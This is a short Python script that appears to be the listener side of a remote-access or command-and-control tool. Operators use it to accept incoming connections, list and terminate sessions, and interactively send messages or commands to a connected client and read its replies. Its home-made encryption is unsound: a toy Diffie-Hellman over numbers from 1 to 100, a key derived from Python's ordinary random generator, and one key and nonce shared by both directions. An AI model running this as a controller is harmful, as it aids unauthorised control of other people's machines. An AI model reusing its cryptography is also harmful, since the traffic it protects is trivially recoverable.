import socket
import requests
import threading
import random
from Crypto.Cipher import ChaCha20_Poly1305

sesh = []

def Recv(Connection):
    data = []
    while True:
        part = Connection.recv(1024)
        data.append(part)
        if len(part) < 1024:
            break
    return b''.join(data)

def Session(Connection):
    Public_P = random.randint(1, 100)
    Public_G = random.randint(1, 100)

    Private_Val = random.randint(1, 100)
    Connection.send((str(Public_G) + "+" + str(Public_P)).encode())
    Public_Key = pow(Public_G, Private_Val, Public_P)
    Shared = Recv(Connection).decode()

    Connection.send(str(Public_Key).encode())

    Secret = pow(int(Shared), Private_Val, Public_P)

    #print(Secret)
    random.seed(Secret)
    key = random.randbytes(32)
    #print(f'{key=}')

    nonce = random.randbytes(100)[-24:]
    #print(f'{nonce=}')

    dCipher = ChaCha20_Poly1305.new(key=key, nonce=nonce)
    eCipher = ChaCha20_Poly1305.new(key=key, nonce=nonce)

    while True:
        msg = input("Enter in message: ").encode()
        if(msg == b'exit'):
            Connection.send(msg)
            Connection.close()
            break

        Connection.send(dCipher.encrypt(msg))
        message = Recv(Connection)
        print(eCipher.decrypt(message).decode())



def main():
    while True:
        command = input("Enter command: ").split()
        if(command[0] == "listen"):
            Sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            Sock.bind((command[1], int(command[2])))
            Sock.listen()
            print(f"[!] Listening for connections on {command[2]}")
            Connection, Address = Sock.accept()
            print(f"[+] {Address} successfully connected!")
            sesh.append([Connection, Address])

        if(command[0] == "sessions"):
            for count, i in enumerate(sesh):
                print(f'Session {count} --> {i[1]}')

        if(command[0] == "terminate"):
            if(command[1] == "all"):
                for i in sesh:
                    i[0].close()
                break
            else:
                sesh[int(command[1])][0].close()
                sesh[int(command[1])].pop()
        
        if(command[0] == "interact"):
            Session(sesh[int(command[1])][0])

main()
